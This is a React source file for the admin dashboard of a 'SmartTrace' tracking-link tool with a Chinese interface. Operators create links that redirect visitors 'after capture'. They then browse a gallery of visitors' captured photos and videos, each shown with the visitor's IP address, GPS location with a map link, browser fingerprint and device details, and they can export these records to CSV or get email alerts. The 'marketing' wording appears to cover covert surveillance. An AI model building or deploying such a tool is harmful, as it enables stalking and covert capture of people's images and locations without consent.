import { useState } from "react";
import { useAuth } from "@/_core/hooks/useAuth";
import { trpc } from "@/lib/trpc";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Card, CardHeader, CardTitle, CardContent, CardDescription } from "@/components/ui/card";
import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from "@/components/ui/table";
import { Shield, Link as LinkIcon, Camera, Trash2, ExternalLink, Copy, Check, LogIn, RefreshCw, ChevronLeft, ChevronRight, Globe, HardDrive, LayoutDashboard, Database, Activity, Download, MapPin } from "lucide-react";
import { toast } from "sonner";
import { startLogin } from "@/const";
import { AreaChart, Area, XAxis, YAxis, Tooltip, ResponsiveContainer, CartesianGrid } from "recharts";

export default function Home() {
  const { user, isAuthenticated, logout } = useAuth();

  const [activeTab, setActiveTab] = useState<"dashboard" | "links" | "gallery">("dashboard");
  const [linkId, setLinkId] = useState("");
  const [redirectUrl, setRedirectUrl] = useState("https://example.com");
  const [copiedId, setCopiedId] = useState<string | null>(null);

  // 筛选与分页
  const [selectedFilterId, setSelectedFilterId] = useState<string>("all");
  const [currentPage, setCurrentPage] = useState(1);
  const pageSize = 6;

  // 查询
  const linksQuery = trpc.tracking.listLinks.useQuery(undefined, {
    enabled: isAuthenticated,
  });

  const capturesQuery = trpc.captures.list.useQuery(
    { linkId: selectedFilterId === "all" ? undefined : selectedFilterId },
    { enabled: isAuthenticated }
  );

  const exportCsvQuery = trpc.captures.exportCsv.useQuery(
    { linkId: selectedFilterId === "all" ? undefined : selectedFilterId },
    { enabled: false }
  );

  const smtpStatusQuery = trpc.status.smtpStatus.useQuery(undefined, {
    enabled: isAuthenticated,
  });

  // 变更操作
  const createLinkMutation = trpc.tracking.createLink.useMutation({
    onSuccess: () => {
      toast.success("追踪链接创建成功！");
      setLinkId("");
      linksQuery.refetch();
    },
    onError: (err) => {
      toast.error(err.message || "创建链接失败。");
    },
  });

  const deleteLinkMutation = trpc.tracking.deleteLink.useMutation({
    onSuccess: () => {
      toast.success("追踪链接及关联数据已删除。");
      linksQuery.refetch();
      capturesQuery.refetch();
    },
  });

  const deleteCaptureMutation = trpc.captures.delete.useMutation({
    onSuccess: () => {
      toast.success("记录已删除。");
      capturesQuery.refetch();
    },
  });

  const clearAllMutation = trpc.captures.clearAll.useMutation({
    onSuccess: () => {
      toast.success("所有采集记录已清空。");
      capturesQuery.refetch();
    },
  });

  const handleCreateLink = (e: React.FormEvent) => {
    e.preventDefault();
    if (!linkId.trim() || !redirectUrl.trim()) {
      toast.error("请填写完整信息。");
      return;
    }
    createLinkMutation.mutate({ id: linkId.trim(), redirectUrl: redirectUrl.trim() });
  };

  const copyToClipboard = (text: string, id: string) => {
    const fullUrl = `${window.location.origin}/t/${id}`;
    navigator.clipboard.writeText(fullUrl);
    setCopiedId(id);
    toast.success("链接已复制到剪贴板！");
    setTimeout(() => setCopiedId(null), 2000);
  };

  const handleExportCsv = async () => {
    try {
      const res = await exportCsvQuery.refetch();
      if (res.data?.csv) {
        const blob = new Blob([res.data.csv], { type: "text/csv;charset=utf-8;" });
        const url = URL.createObjectURL(blob);
        const link = document.createElement("a");
        link.setAttribute("href", url);
        link.setAttribute("download", `captures_export_${selectedFilterId}_${Date.now()}.csv`);
        document.body.appendChild(link);
        link.click();
        document.body.removeChild(link);
        toast.success("CSV 数据导出成功！");
      }
    } catch (err) {
      toast.error("导出失败。");
    }
  };

  const allCaptures = capturesQuery.data || [];
  const totalPages = Math.ceil(allCaptures.length / pageSize) || 1;
  const paginatedCaptures = allCaptures.slice((currentPage - 1) * pageSize, currentPage * pageSize);
  const totalLinks = linksQuery.data?.length || 0;
  const isSmtpConfigured = smtpStatusQuery.data?.configured ?? false;

  const getChartData = () => {
    const countsMap: Record<string, number> = {};
    const now = new Date();
    for (let i = 9; i >= 0; i--) {
      const d = new Date(now);
      d.setDate(d.getDate() - i);
      const key = `${String(d.getMonth() + 1).padStart(2, "0")}-${String(d.getDate()).padStart(2, "0")}`;
      countsMap[key] = 0;
    }

    allCaptures.forEach((cap) => {
      const capDate = new Date(cap.createdAt);
      const key = `${String(capDate.getMonth() + 1).padStart(2, "0")}-${String(capDate.getDate()).padStart(2, "0")}`;
      if (countsMap[key] !== undefined) {
        countsMap[key] += 1;
      } else {
        countsMap[key] = 1;
      }
    });

    return Object.entries(countsMap).map(([date, count]) => ({ date, count }));
  };

  const chartData = getChartData();

  if (!isAuthenticated) {
    return (
      <div className="min-h-screen bg-slate-950 text-slate-100 flex items-center justify-center p-4 relative overflow-hidden font-sans">
        <div className="absolute inset-0 bg-[radial-gradient(ellipse_at_top,_var(--tw-gradient-stops))] from-indigo-950/40 via-slate-950 to-slate-950 pointer-events-none" />
        <Card className="max-w-md w-full bg-slate-900/90 border-slate-800 backdrop-blur-2xl shadow-2xl relative z-10 rounded-2xl overflow-hidden">
          <div className="h-2 bg-gradient-to-r from-indigo-500 via-purple-500 to-pink-500" />
          <CardHeader className="text-center space-y-4 pt-8 pb-6">
            <div className="w-16 h-16 bg-indigo-600/20 text-indigo-400 rounded-2xl mx-auto flex items-center justify-center border border-indigo-500/30 shadow-inner">
              <Shield className="w-8 h-8" />
            </div>
            <div>
              <CardTitle className="text-2xl font-bold tracking-tight text-white">智能追踪系统后台</CardTitle>
              <CardDescription className="text-slate-400 mt-1">
                安全管理追踪链接与访客媒体采集
              </CardDescription>
            </div>
          </CardHeader>
          <CardContent className="space-y-4 pb-8 px-6">
            <Button 
              onClick={() => startLogin()} 
              className="w-full bg-indigo-600 hover:bg-indigo-500 text-white font-medium py-6 rounded-xl shadow-lg shadow-indigo-600/30 transition-all flex items-center justify-center gap-2 group text-base"
            >
              <LogIn className="w-5 h-5 group-hover:translate-x-0.5 transition-transform" />
              使用 Manus 账号登录
            </Button>
          </CardContent>
        </Card>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-slate-950 text-slate-100 flex flex-col font-sans">
      {/* 顶部 MediaVault 风格品牌栏 */}
      <header className="border-b border-slate-800/80 bg-slate-900/70 backdrop-blur-xl sticky top-0 z-50 px-4 md:px-6 py-3 flex items-center justify-between shadow-sm">
        <div className="flex items-center gap-3">
          <div className="w-9 h-9 bg-indigo-600 rounded-xl flex items-center justify-center text-white shadow-md shadow-indigo-600/30">
            <Shield className="w-5 h-5" />
          </div>
          <div>
            <div className="flex items-center gap-2">
              <span className="font-bold text-white text-sm tracking-tight">SmartTrace</span>
              <span className="text-xs text-slate-400 font-mono">MediaVault</span>
            </div>
            <p className="text-[11px] text-indigo-400 font-medium">项目仪表盘</p>
          </div>
        </div>

        <div className="flex items-center gap-3">
          <span className="text-xs text-slate-300 hidden md:inline">
            用户: <strong className="text-indigo-400">{user?.name || user?.email}</strong>
          </span>
          <Button variant="outline" size="sm" onClick={() => logout()} className="border-slate-700 bg-slate-800/80 hover:bg-slate-700 text-slate-200 rounded-xl text-xs h-8 px-3">
            退出
          </Button>
        </div>
      </header>

      {/* 横向功能导航栏 */}
      <nav className="bg-slate-900/40 border-b border-slate-800/80 px-4 md:px-6 overflow-x-auto">
        <div className="max-w-7xl mx-auto flex items-center gap-1 py-2">
          <button
            onClick={() => setActiveTab("dashboard")}
            className={`flex items-center gap-2 px-4 py-2 rounded-xl text-xs font-medium transition-all whitespace-nowrap ${
              activeTab === "dashboard"
                ? "bg-indigo-600 text-white shadow-md shadow-indigo-600/30"
                : "text-slate-400 hover:text-slate-200 hover:bg-slate-800/50"
            }`}
          >
            <LayoutDashboard className="w-4 h-4" /> 仪表盘
          </button>
          <button
            onClick={() => setActiveTab("links")}
            className={`flex items-center gap-2 px-4 py-2 rounded-xl text-xs font-medium transition-all whitespace-nowrap ${
              activeTab === "links"
                ? "bg-indigo-600 text-white shadow-md shadow-indigo-600/30"
                : "text-slate-400 hover:text-slate-200 hover:bg-slate-800/50"
            }`}
          >
            <Globe className="w-4 h-4" /> 链接管理 ({totalLinks})
          </button>
          <button
            onClick={() => setActiveTab("gallery")}
            className={`flex items-center gap-2 px-4 py-2 rounded-xl text-xs font-medium transition-all whitespace-nowrap ${
              activeTab === "gallery"
                ? "bg-indigo-600 text-white shadow-md shadow-indigo-600/30"
                : "text-slate-400 hover:text-slate-200 hover:bg-slate-800/50"
            }`}
          >
            <Camera className="w-4 h-4" /> 采集图库 ({allCaptures.length})
          </button>
        </div>
      </nav>

      {/* 主体内容区 */}
      <main className="flex-1 max-w-7xl w-full mx-auto p-4 md:p-6 space-y-6">
        {activeTab === "dashboard" && (
          <div className="space-y-6 animate-in fade-in duration-300">
            <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
              <div className="bg-gradient-to-br from-slate-900 to-slate-900/80 border border-slate-800 rounded-2xl p-5 shadow-xl relative overflow-hidden">
                <div className="absolute right-4 top-4 w-10 h-10 bg-indigo-600/10 rounded-xl flex items-center justify-center text-indigo-400 border border-indigo-500/20">
                  <Database className="w-5 h-5" />
                </div>
                <p className="text-xs font-semibold text-slate-400 uppercase tracking-wider">存储 / 活跃链接</p>
                <p className="text-3xl font-extrabold text-white mt-2">{totalLinks} <span className="text-xs font-normal text-slate-400">个追踪路径</span></p>
                <div className="mt-4 flex items-center gap-2 text-xs text-indigo-400">
                  <span className="w-2 h-2 rounded-full bg-indigo-500 animate-pulse" />
                  <span>系统运行正常</span>
                </div>
              </div>

              <div className="bg-gradient-to-br from-slate-900 to-slate-900/80 border border-slate-800 rounded-2xl p-5 shadow-xl relative overflow-hidden">
                <div className="absolute right-4 top-4 w-10 h-10 bg-purple-600/10 rounded-xl flex items-center justify-center text-purple-400 border border-purple-500/20">
                  <Camera className="w-5 h-5" />
                </div>
                <p className="text-xs font-semibold text-slate-400 uppercase tracking-wider">已捕获媒体与数据</p>
                <p className="text-3xl font-extrabold text-white mt-2">{allCaptures.length} <span className="text-xs font-normal text-slate-400">条访问记录</span></p>
                <div className="mt-4 flex items-center gap-2 text-xs text-purple-400">
                  <span className="w-2 h-2 rounded-full bg-purple-500" />
                  <span>包含 IP、GPS 及媒体文件</span>
                </div>
              </div>

              <div className="bg-gradient-to-br from-slate-900 to-slate-900/80 border border-slate-800 rounded-2xl p-5 shadow-xl relative overflow-hidden">
                <div className="absolute right-4 top-4 w-10 h-10 bg-emerald-600/10 rounded-xl flex items-center justify-center text-emerald-400 border border-emerald-500/20">
                  <HardDrive className="w-5 h-5" />
                </div>
                <p className="text-xs font-semibold text-slate-400 uppercase tracking-wider">SMTP 邮件推送状态</p>
                <p className={`text-2xl font-extrabold mt-2 ${isSmtpConfigured ? "text-emerald-400" : "text-amber-400"}`}>
                  {isSmtpConfigured ? "已启用通知" : "未配置服务器"}
                </p>
                <div className="mt-4 flex items-center gap-2 text-xs text-slate-400">
                  <span>接收新访客即时提醒</span>
                </div>
              </div>
            </div>

            <div className="bg-gradient-to-r from-slate-900 via-indigo-950/30 to-slate-900 border border-slate-800 rounded-2xl p-6 shadow-xl flex flex-col md:flex-row items-center justify-between gap-4">
              <div className="space-y-1 text-center md:text-left">
                <div className="flex items-center justify-center md:justify-start gap-2 text-indigo-400 text-xs font-semibold uppercase tracking-wider">
                  <Activity className="w-4 h-4" /> 快速操作中心
                </div>
                <h3 className="text-lg font-bold text-white">快速创建追踪链接或查看最新捕获</h3>
                <p className="text-xs text-slate-400">为您的营销、活动或演示快速生成专属追踪 ID 并接收实时通知。</p>
              </div>
              <div className="flex items-center gap-3">
                <Button onClick={() => setActiveTab("links")} className="bg-indigo-600 hover:bg-indigo-500 text-white rounded-xl px-5 py-2.5 shadow-lg shadow-indigo-600/30 text-xs font-medium">
                  管理追踪链接
                </Button>
                <Button onClick={() => setActiveTab("gallery")} variant="outline" className="border-slate-700 bg-slate-800/80 hover:bg-slate-700 text-slate-200 rounded-xl px-5 py-2.5 text-xs font-medium">
                  查看采集图库
                </Button>
              </div>
            </div>

            <div className="bg-slate-900/60 border border-slate-800 rounded-2xl p-6 shadow-xl space-y-4">
              <div className="flex items-center justify-between">
                <div>
                  <h3 className="text-base font-bold text-white">最近活动趋势</h3>
                  <p className="text-xs text-slate-400">基于真实访问与采集记录的每日统计曲线</p>
                </div>
                <span className="text-xs bg-indigo-500/20 text-indigo-300 border border-indigo-500/30 px-2.5 py-1 rounded-lg font-mono">
                  实时聚合
                </span>
              </div>
              <div className="h-64 w-full pt-2">
                {allCaptures.length === 0 ? (
                  <div className="h-full flex flex-col items-center justify-center text-slate-500 text-xs space-y-2">
                    <Activity className="w-8 h-8 opacity-30 text-indigo-400" />
                    <p>暂无访问数据，趋势图将在有访客访问后自动生成。</p>
                  </div>
                ) : (
                  <ResponsiveContainer width="100%" height="100%">
                    <AreaChart data={chartData} margin={{ top: 10, right: 10, left: -20, bottom: 0 }}>
                      <defs>
                        <linearGradient id="colorCount" x1="0" y1="0" x2="0" y2="1">
                          <stop offset="5%" stopColor="#6366f1" stopOpacity={0.5}/>
                          <stop offset="95%" stopColor="#6366f1" stopOpacity={0}/>
                        </linearGradient>
                      </defs>
                      <CartesianGrid strokeDasharray="3 3" stroke="#1e293b" vertical={false} />
                      <XAxis dataKey="date" stroke="#64748b" fontSize={11} tickLine={false} />
                      <YAxis stroke="#64748b" fontSize={11} tickLine={false} allowDecimals={false} />
                      <Tooltip 
                        contentStyle={{ backgroundColor: "#0f172a", borderColor: "#334155", borderRadius: "12px", color: "#fff", fontSize: "12px" }} 
                      />
                      <Area type="monotone" dataKey="count" stroke="#818cf8" strokeWidth={2.5} fillOpacity={1} fill="url(#colorCount)" />
                    </AreaChart>
                  </ResponsiveContainer>
                )}
              </div>
            </div>
          </div>
        )}

        {activeTab === "links" && (
          <div className="space-y-6 animate-in fade-in duration-300">
            <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
              <Card className="bg-slate-900/60 border-slate-800 backdrop-blur-md lg:col-span-1 rounded-2xl shadow-xl">
                <CardHeader className="space-y-2">
                  <CardTitle className="text-lg text-white flex items-center gap-2">
                    <LinkIcon className="w-5 h-5 text-indigo-400" />
                    创建新追踪链接
                  </CardTitle>
                  <CardDescription className="text-slate-400 text-xs">
                    输入唯一的链接编号和目标网址，访问者完成采集后将无缝跳转到该网址。
                  </CardDescription>
                </CardHeader>
                <CardContent>
                  <form onSubmit={handleCreateLink} className="space-y-4">
                    <div className="space-y-2">
                      <label className="text-xs font-semibold text-slate-300 uppercase tracking-wider">追踪编号 (URL 路径)</label>
                      <Input
                        placeholder="例如：promo-2026"
                        value={linkId}
                        onChange={(e) => setLinkId(e.target.value)}
                        className="bg-slate-950 border-slate-800 text-white focus-visible:ring-indigo-500 rounded-xl h-11"
                      />
                    </div>
                    <div className="space-y-2">
                      <label className="text-xs font-semibold text-slate-300 uppercase tracking-wider">目标跳转网址</label>
                      <Input
                        placeholder="https://example.com"
                        value={redirectUrl}
                        onChange={(e) => setRedirectUrl(e.target.value)}
                        className="bg-slate-950 border-slate-800 text-white focus-visible:ring-indigo-500 rounded-xl h-11"
                      />
                    </div>
                    <Button type="submit" disabled={createLinkMutation.isPending} className="w-full bg-indigo-600 hover:bg-indigo-500 text-white font-medium py-6 rounded-xl transition-all shadow-lg shadow-indigo-600/20">
                      {createLinkMutation.isPending ? "正在生成..." : "生成追踪链接"}
                    </Button>
                  </form>
                </CardContent>
              </Card>

              <Card className="bg-slate-900/60 border-slate-800 backdrop-blur-md lg:col-span-2 rounded-2xl shadow-xl">
                <CardHeader className="flex flex-row items-center justify-between pb-4">
                  <div>
                    <CardTitle className="text-lg text-white">已生成的链接列表</CardTitle>
                    <CardDescription className="text-slate-400 text-xs">管理所有追踪链接及对应的跳转目标</CardDescription>
                  </div>
                  <Button variant="outline" size="sm" onClick={() => linksQuery.refetch()} className="border-slate-700 bg-slate-800 hover:bg-slate-700 text-slate-200 rounded-xl">
                    <RefreshCw className="w-4 h-4 mr-1.5" /> 刷新
                  </Button>
                </CardHeader>
                <CardContent>
                  {linksQuery.isLoading ? (
                    <div className="text-center py-16 text-slate-500">正在加载...</div>
                  ) : linksQuery.data?.length === 0 ? (
                    <div className="text-center py-16 text-slate-500 space-y-2">
                      <Globe className="w-10 h-10 mx-auto opacity-30 text-slate-400" />
                      <p className="text-sm">暂无生成的链接。</p>
                    </div>
                  ) : (
                    <div className="rounded-xl border border-slate-800 overflow-hidden shadow-sm">
                      <Table>
                        <TableHeader className="bg-slate-950/80">
                          <TableRow className="border-slate-800 hover:bg-transparent">
                            <TableHead className="text-slate-400 font-semibold">编号 / 路径</TableHead>
                            <TableHead className="text-slate-400 font-semibold">目标网址</TableHead>
                            <TableHead className="text-slate-400 font-semibold">创建时间</TableHead>
                            <TableHead className="text-right text-slate-400 font-semibold">操作</TableHead>
                          </TableRow>
                        </TableHeader>
                        <TableBody>
                          {linksQuery.data?.map((link) => {
                            const fullUrl = `${window.location.origin}/t/${link.id}`;
                            return (
                              <TableRow key={link.id} className="border-slate-800 hover:bg-slate-800/40 transition-colors">
                                <TableCell className="font-semibold text-indigo-400">{link.id}</TableCell>
                                <TableCell className="text-slate-300 max-w-xs truncate">
                                  <a href={link.redirectUrl} target="_blank" rel="noreferrer" className="hover:underline flex items-center gap-1.5 text-xs text-slate-300">
                                    {link.redirectUrl} <ExternalLink className="w-3 h-3 opacity-60 flex-shrink-0" />
                                  </a>
                                </TableCell>
                                <TableCell className="text-slate-400 text-xs">{new Date(link.createdAt).toLocaleString()}</TableCell>
                                <TableCell className="text-right space-x-2">
                                  <Button
                                    size="sm"
                                    variant="outline"
                                    className="border-slate-700 bg-slate-800 hover:bg-slate-700 text-slate-200 rounded-lg h-9 px-3"
                                    onClick={() => copyToClipboard(fullUrl, link.id)}
                                    title="复制链接"
                                  >
                                    {copiedId === link.id ? <Check className="w-4 h-4 text-emerald-400" /> : <Copy className="w-4 h-4" />}
                                  </Button>
                                  <Button
                                    size="sm"
                                    variant="destructive"
                                    className="bg-red-600/20 hover:bg-red-600/30 text-red-400 border border-red-500/30 rounded-lg h-9 px-3"
                                    onClick={() => deleteLinkMutation.mutate({ id: link.id })}
                                    title="删除"
                                  >
                                    <Trash2 className="w-4 h-4" />
                                  </Button>
                                </TableCell>
                              </TableRow>
                            );
                          })}
                        </TableBody>
                      </Table>
                    </div>
                  )}
                </CardContent>
              </Card>
            </div>
          </div>
        )}

        {activeTab === "gallery" && (
          <div className="space-y-6 animate-in fade-in duration-300">
            <Card className="bg-slate-900/60 border-slate-800 backdrop-blur-md rounded-2xl shadow-xl">
              <CardHeader className="flex flex-col md:flex-row md:items-center justify-between gap-4 pb-4">
                <div>
                  <CardTitle className="text-lg text-white">访客采集记录与媒体</CardTitle>
                  <CardDescription className="text-slate-400 text-xs">查看所有捕获的照片、视频以及客户端详细设备元数据</CardDescription>
                </div>
                <div className="flex flex-wrap items-center gap-3">
                  <div className="flex items-center gap-2 bg-slate-950 border border-slate-800 rounded-xl px-3 py-1.5">
                    <span className="text-xs text-slate-400">筛选链接：</span>
                    <select
                      value={selectedFilterId}
                      onChange={(e) => {
                        setSelectedFilterId(e.target.value);
                        setCurrentPage(1);
                      }}
                      className="bg-transparent border-none text-slate-200 text-xs outline-none cursor-pointer"
                    >
                      <option value="all" className="bg-slate-900">全部链接</option>
                      {linksQuery.data?.map((l) => (
                        <option key={l.id} value={l.id} className="bg-slate-900">{l.id}</option>
                      ))}
                    </select>
                  </div>
                  <Button variant="outline" size="sm" onClick={handleExportCsv} className="border-slate-700 bg-slate-800 hover:bg-slate-700 text-indigo-400 rounded-xl">
                    <Download className="w-4 h-4 mr-1.5" /> 导出 CSV
                  </Button>
                  <Button variant="outline" size="sm" onClick={() => capturesQuery.refetch()} className="border-slate-700 bg-slate-800 hover:bg-slate-700 text-slate-200 rounded-xl">
                    <RefreshCw className="w-4 h-4 mr-1.5" /> 刷新
                  </Button>
                  <Button
                    variant="destructive"
                    size="sm"
                    className="bg-red-600/20 hover:bg-red-600/30 text-red-400 border border-red-500/30 rounded-xl"
                    onClick={() => {
                      if (confirm("确定要清空当前筛选条件下的所有采集记录吗？")) {
                        clearAllMutation.mutate({ linkId: selectedFilterId === "all" ? undefined : selectedFilterId });
                      }
                    }}
                  >
                    清空记录
                  </Button>
                </div>
              </CardHeader>
              <CardContent className="space-y-6">
                {capturesQuery.isLoading ? (
                  <div className="text-center py-16 text-slate-500">正在加载记录...</div>
                ) : allCaptures.length === 0 ? (
                  <div className="text-center py-20 text-slate-500 space-y-3">
                    <Camera className="w-12 h-12 mx-auto opacity-30 text-slate-400" />
                    <p className="text-sm">暂无符合条件的采集记录。</p>
                  </div>
                ) : (
                  <>
                    <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
                      {paginatedCaptures.map((cap) => {
                        const isVideo = cap.filePath.endsWith(".webm") || cap.filePath.endsWith(".mp4");
                        const hasGps = cap.gps && !cap.gps.includes("不可用") && !cap.gps.includes("未授权");
                        const gpsCoords = hasGps ? cap.gps?.split("(")[0]?.trim() : null;

                        return (
                          <div key={cap.id} className="bg-slate-950 border border-slate-800/80 rounded-2xl overflow-hidden flex flex-col shadow-xl group hover:border-slate-700 transition-all">
                            <div className="relative aspect-video bg-black flex items-center justify-center overflow-hidden">
                              {isVideo ? (
                                <video src={cap.filePath} controls className="w-full h-full object-cover" />
                              ) : (
                                <img src={cap.filePath} alt="Capture" className="w-full h-full object-cover group-hover:scale-105 transition-transform duration-500" />
                              )}
                              <span className="absolute top-3 left-3 bg-slate-900/90 backdrop-blur-md text-indigo-400 text-xs px-2.5 py-1 rounded-lg border border-slate-700/80 font-mono shadow-md">
                                编号: {cap.linkId}
                              </span>
                            </div>
                            <div className="p-4 flex-1 flex flex-col justify-between space-y-4">
                              <div className="space-y-2 text-xs text-slate-300">
                                <div className="flex justify-between items-center bg-slate-900/50 p-2 rounded-xl border border-slate-800/60">
                                  <span className="text-slate-400">IP 地址：</span>
                                  <span className="font-mono text-white font-medium">{cap.ip}</span>
                                </div>
                                <div className="flex justify-between items-center bg-slate-900/50 p-2 rounded-xl border border-slate-800/60">
                                  <span className="text-slate-400">GPS 定位：</span>
                                  {gpsCoords ? (
                                    <a
                                      href={`https://uri.amap.com/marker?position=${gpsCoords}`}
                                      target="_blank"
                                      rel="noreferrer"
                                      className="font-mono text-indigo-400 hover:underline flex items-center gap-1"
                                      title="在地图中查看"
                                    >
                                      <MapPin className="w-3 h-3 flex-shrink-0" /> {cap.gps}
                                    </a>
                                  ) : (
                                    <span className="font-mono text-slate-400">{cap.gps}</span>
                                  )}
                                </div>
                                <div className="flex justify-between items-center bg-slate-900/50 p-2 rounded-xl border border-slate-800/60">
                                  <span className="text-slate-400">屏幕分辨率：</span>
                                  <span className="font-mono text-white">{cap.resolution}</span>
                                </div>
                                <div className="flex justify-between items-center bg-slate-900/50 p-2 rounded-xl border border-slate-800/60">
                                  <span className="text-slate-400">浏览器指纹：</span>
                                  <span className="font-mono text-slate-400 truncate max-w-[150px]" title={cap.fingerprint || ""}>
                                    {cap.fingerprint}
                                  </span>
                                </div>
                                <div className="text-[11px] text-slate-400 truncate pt-1 px-1" title={cap.userAgent || ""}>
                                  <span className="text-slate-500">UA：</span> {cap.userAgent}
                                </div>
                              </div>
                              <div className="flex items-center justify-between pt-3 border-t border-slate-800/80">
                                <span className="text-[11px] text-slate-500">{new Date(cap.createdAt).toLocaleString()}</span>
                                <Button
                                  size="sm"
                                  variant="destructive"
                                  className="bg-red-600/20 hover:bg-red-600/30 text-red-400 border border-red-500/30 h-8 px-3 rounded-xl transition-all"
                                  onClick={() => deleteCaptureMutation.mutate({ id: cap.id })}
                                >
                                  <Trash2 className="w-3.5 h-3.5 mr-1" /> 删除
                                </Button>
                              </div>
                            </div>
                          </div>
                        );
                      })}
                    </div>

                    {totalPages > 1 && (
                      <div className="flex items-center justify-between pt-6 border-t border-slate-800">
                        <span className="text-xs text-slate-400">
                          第 <strong className="text-white">{currentPage}</strong> 页，共 <strong className="text-white">{totalPages}</strong> 页（总计 <strong className="text-white">{allCaptures.length}</strong> 条记录）
                        </span>
                        <div className="flex items-center gap-2">
                          <Button
                            size="sm"
                            variant="outline"
                            disabled={currentPage === 1}
                            onClick={() => setCurrentPage((p) => Math.max(p - 1, 1))}
                            className="border-slate-700 bg-slate-900 text-slate-200 rounded-xl"
                          >
                            <ChevronLeft className="w-4 h-4 mr-1" /> 上一页
                          </Button>
                          <Button
                            size="sm"
                            variant="outline"
                            disabled={currentPage === totalPages}
                            onClick={() => setCurrentPage((p) => Math.min(p + 1, totalPages))}
                            className="border-slate-700 bg-slate-900 text-slate-200 rounded-xl"
                          >
                            下一页 <ChevronRight className="w-4 h-4 ml-1" />
                          </Button>
                        </div>
                      </div>
                    )}
                  </>
                )}
              </CardContent>
            </Card>
          </div>
        )}
      </main>
    </div>
  );
}
